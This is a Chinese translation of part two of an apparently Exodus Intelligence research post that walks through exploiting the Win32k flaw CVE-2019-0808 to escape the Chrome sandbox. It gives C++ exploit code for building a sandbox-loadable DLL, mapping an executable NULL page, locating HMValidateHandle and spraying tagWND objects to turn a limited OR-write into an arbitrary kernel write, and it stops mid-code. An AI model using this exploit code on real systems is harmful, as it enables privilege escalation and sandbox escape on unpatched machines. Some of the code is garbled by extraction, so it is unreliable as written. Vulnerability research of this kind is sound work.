# Windows版“碟中谍”：如何利用Win32k漏洞实现Chrome沙盒逃逸（下）
|
##### 译文声明
本文是翻译文章，文章原作者 exodusintel，文章来源：blog.exodusintel.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 写在前面的话
在我们的《Windows版“碟中谍”：如何利用Win32k漏洞实现Chrome沙盒逃逸（上）》这篇文章中，我们对近期修复的一个Win32k漏洞（CVE-2019-0808）进行了分析，在给出了针对该漏洞的PoC代码之后，我们还对这份PoC代码及其核心组件进行了深入分析。那么在这篇文章中，我们将跟大家详细介绍如何利用这个Chrome沙盒漏洞，并详细介绍漏洞利用过程中的每一个步骤。
## Chrome沙盒漏洞利用解析
###  针对Chrome沙盒创建DLL针对Chrome沙盒创建DLL
在此之前，研究人员James
Forshaw在他的博文中曾提到过，Chrome沙盒是无法注入任何DLL的。由于沙盒限制，DLL必须以特定的方法创建，而且沙盒不会加载任何其他的代码库或manifest文件。
为了实现这个目标，我们选择使用Visual
Studio项目来实现PoC，并将项目类型设置为DLL，而不是EXE。接下来，在C++编译器设置中，使用多线程运行库，并设置Visual
Studio不生成manifest文件。
完成之后，Visual Studio就可以通过漏洞（CVE-2019-5786或其他DLL注入技术）来在Chrome沙盒中生成并加载DLL了。
###  理解现有的限制写入原语
首先，我们需要了解限制写入原语，它可以帮助攻击者成功设置一个NULL页面，这也是利用该漏洞的基础。漏洞触发后，win32k.sys中的xxxMNUpdateDraggingInfo()将会被调用，如果NULL页面设置正确，那么xxxMNUpdateDraggingInfo()将会调用xxxMNSetGapState()，相关代码如下：
`void __stdcall xxxMNSetGapState(ULONG_PTR uHitArea, UINT uIndex, UINT uFlags,
BOOL fSet)  
{  
...  
var_PITEM = MNGetpItem(var_POPUPMENU, uIndex); // Get the address where the
first write  
// operation should occur, minus an  
// offset of 0x4.  
temp_var_PITEM = var_PITEM;  
if ( var_PITEM )  
{  
...  
var_PITEM_Minus_Offset_Of_0x6C = MNGetpItem(var_POPUPMENU_copy, uIndex - 1);
// Get the  
// address where the second write operation  
// should occur, minus an offset of 0x4. This  
// address will be 0x6C bytes earlier in  
// memory than the address in var_PITEM.  
if ( fSet )  
{  
*((_DWORD *)temp_var_PITEM + 1) |= 0x80000000; // Conduct the first write to the  
// attacker controlled address.  
if ( var_PITEM_Minus_Offset_Of_0x6C )  
{  
*((_DWORD *)var_PITEM_Minus_Offset_Of_0x6C + 1) |= 0x40000000u;  
// Conduct the second write to the attacker  
// controlled address minus 0x68 (0x6C-0x4).  
...`
``xxxMNSetGapState()会向攻击者控制的位置（偏移量+4）执行两次写入操作，这两次的区别是数据写入的位置比之前的靠前了0x6C字节。而且，写入使用的是OR操作，这也就意味着攻击者只需要向DWORD值中添加bit即可，而且无法删除或修改之前的位数据。
根据我们的观察，攻击者如果想实现Chrome沙盒逃逸的话，他们还需要使用更加强大的写入原语。因此，这里可以使用限制写入原语和tagWND对象来实现更加强大的写入原语。
###  分配NULL页面
在PoC代码中，main()函数可以从ntdll.dll中获取NtAllocateVirtualMemory()的地址，并将其存储在变量pfnNtAllocateVirtualMemory中。完成后，代码会调用allocateNullPage()来分配NULL页面，地址为0x1，权限包含读、写和可执行。接下来，地址0x1会通过NtAllocateVirtualMemory()来自减，并靠近页面边界，此时攻击者将能够分配地址为0x0的内存。
`typedef NTSTATUS(WINAPI *NTAllocateVirtualMemory)(  
HANDLE ProcessHandle,  
PVOID *BaseAddress,  
ULONG ZeroBits,  
PULONG AllocationSize,  
ULONG AllocationType,  
ULONG Protect  
);  
NTAllocateVirtualMemory pfnNtAllocateVirtualMemory = 0;  
....  
pfnNtAllocateVirtualMemory =
(NTAllocateVirtualMemory)GetProcAddress(GetModuleHandle(L"ntdll.dll"),
"NtAllocateVirtualMemory");  
....  
// Thanks to
https://github.com/YeonExp/HEVD/blob/c19ad75ceab65cff07233a72e2e765be866fd636/NullPointerDereference/NullPointerDereference/main.cpp#L56
for  
// explaining this in an example along with the finer details that are often
forgotten.  
bool allocateNullPage() {  
/* Set the base address at which the memory will be allocated to 0x1.  
This is done since a value of 0x0 will not be accepted by
NtAllocateVirtualMemory,  
however due to page alignment requirements the 0x1 will be rounded down to 0x0
internally.*/  
PVOID BaseAddress = (PVOID)0x1;  
/* Set the size to be allocated to 40960 to ensure that there  
is plenty of memory allocated and available for use. */  
SIZE_T size = 40960;  
/* Call NtAllocateVirtualMemory to allocate the virtual memory at address 0x0
with the size  
specified in the variable size. Also make sure the memory is allocated with
read, write,  
and execute permissions.*/  
NTSTATUS result = pfnNtAllocateVirtualMemory(GetCurrentProcess(),
&BaseAddress, 0x0, &size, MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
PAGE_EXECUTE_READWRITE);  
// If the call to NtAllocateVirtualMemory failed, return FALSE.  
if (result != 0x0) {  
return FALSE;  
}  
// If the code reaches this point, then everything went well, so return TRUE.  
return TRUE;  
}`
###  利用窗口对象创建任意内和地址写入原语
首先，攻击者需要获取到HMValidateHandle()的地址，而HMValidateHandle()的作用就是帮助攻击者获取用户态的拷贝对象。相关代码如下：
`HMODULE hUser32 = LoadLibraryW(L"user32.dll");  
LoadLibraryW(L"gdi32.dll");  
// Find the address of HMValidateHandle using the address of user32.dll  
if (findHMValidateHandleAddress(hUser32) == FALSE) {  
printf("[!] Couldn't locate the address of HMValidateHandle!rn");  
ExitProcess(-1);  
}  
...  
BOOL findHMValidateHandleAddress(HMODULE hUser32) {  
// The address of the function HMValidateHandleAddress() is not exported to  
// the public. However the function IsMenu() contains a call to
HMValidateHandle()  
// within it after some short setup code. The call starts with the byte xEB.  
// Obtain the address of the function IsMenu() from user32.dll.  
BYTE * pIsMenuFunction = (BYTE *)GetProcAddress(hUser32, "IsMenu");  
if (pIsMenuFunction == NULL) {  
printf("[!] Failed to find the address of IsMenu within user32.dll.rn");  
return FALSE;  
}  
else {  
printf("[*] pIsMenuFunction: 0x%08Xrn", pIsMenuFunction);  
}  
// Search for the location of the xEB byte within the IsMenu() function  
// to find the start of the indirect call to HMValidateHandle().  
unsigned int offsetInIsMenuFunction = 0;  
BOOL foundHMValidateHandleAddress = FALSE;  
for (unsigned int i = 0; i > 0x1000; i++) {  
BYTE* pCurrentByte = pIsMenuFunction + i;  
if (*pCurrentByte == 0xE8) {  
offsetInIsMenuFunction = i + 1;  
break;  
}  
}  
// Throw error and exit if the xE8 byte couldn't be located.  
if (offsetInIsMenuFunction == 0) {  
printf("[!] Couldn't find offset to HMValidateHandle within IsMenu.rn");  
return FALSE;  
}  
// Output address of user32.dll in memory for debugging purposes.  
printf("[*] hUser32: 0x%08Xrn", hUser32);  
// Get the value of the relative address being called within the IsMenu()
function.  
unsigned int relativeAddressBeingCalledInIsMenu = *(unsigned int
*)(pIsMenuFunction + offsetInIsMenuFunction);  
printf("[*] relativeAddressBeingCalledInIsMenu: 0x%08Xrn",
relativeAddressBeingCalledInIsMenu);  
// Find out how far the IsMenu() function is located from the base address of
user32.dll.  
unsigned int addressOfIsMenuFromStartOfUser32 = ((unsigned int)pIsMenuFunction
- (unsigned int)hUser32);  
printf("[*] addressOfIsMenuFromStartOfUser32: 0x%08Xrn",
addressOfIsMenuFromStartOfUser32);  
// Take this offset and add to it the relative address used in the call to
HMValidateHandle().  
// Result should be the offset of HMValidateHandle() from the start of
user32.dll.  
unsigned int offset = addressOfIsMenuFromStartOfUser32 +
relativeAddressBeingCalledInIsMenu;  
printf("[*] offset: 0x%08Xrn", offset);  
// Skip over 11 bytes since on Windows 10 these are not NOPs and it would be  
// ideal if this code could be reused in the future.  
pHmValidateHandle = (lHMValidateHandle)((unsigned int)hUser32 + offset + 11);  
printf("[*] pHmValidateHandle: 0x%08Xrn", pHmValidateHandle);  
return TRUE;  
}`
获取到HMValidateHandle()的地址之后，PoC代码将会调用sprayWindows()函数，它的作用就是使用RegisterClassExW()来注册一个名叫sprayWindowClass的窗口类，这个类可以调用攻击者定义的窗口进程sprayCallback()。此时，将会创建一个名叫hwndSprayHandleTable的HWND表，并调用CreateWindowExW()在0x100创建sprayWindowClass类的tagWND对象，然后将处理函数存储到hwndSprayHandle表中。每一个tagWND对象的内核地址都会存储在tagWND对象的pSelf域中。下面给出的是sprayWindows类的数据结构：
    / The following definitions define the various structures
    needed within sprayWindows() /
    typedef struct _HEAD
    {
    HANDLE h;
    DWORD cLockObj;
    } HEAD, PHEAD;
    typedef struct _THROBJHEAD
    {
    HEAD h;
    PVOID pti;
    } THROBJHEAD, PTHROBJHEAD;
    typedef struct _THRDESKHEAD
    {
    THROBJHEAD h;
    PVOID rpdesk;
    PVOID pSelf; // points to the kernel mode address of the object
    } THRDESKHEAD, *PTHRDESKHEAD;
    ….
    // Spray the windows and find two that are less than 0x3fd00 apart in memory.
    if (sprayWindows() == FALSE) {
    printf(“[!] Couldn’t find two tagWND objects less than 0x3fd00 apart in memory after the spray!rn”);
    ExitProcess(-1);
    }
    ….
    // Define the HMValidateHandle window type TYPE_WINDOW appropriately.
    define TYPE_WINDOW 1
    / Main function for spraying the tagWND objects into memory and finding two
    that are less than 0x3fd00 apart /
    bool sprayWindows() {
    HWND hwndSprayHandleTable[0x100]; // Create a table to hold 0x100 HWND handles created by the spray.
    // Create and set up the window class for the sprayed window objects.
    WNDCLASSEXW sprayClass = { 0 };
    sprayClass.cbSize = sizeof(WNDCLASSEXW);
    sprayClass.lpszClassName = TEXT(“sprayWindowClass”);
    sprayClass.lpfnWndProc = sprayCallback; // Set the window procedure for the sprayed
    // window objects to sprayCallback().
    if (RegisterClassExW(&sprayClass) == 0) {
    printf(“[!] Couldn’t register the sprayClass class!rn”);
    }
    // Create 0x100 windows using the sprayClass window class with the window name “spray”.
    for (int i = 0; i pSelf;
    // Then start a loop to start comparing the kernel address of this hWND
    // object to the kernel address of every other hWND object…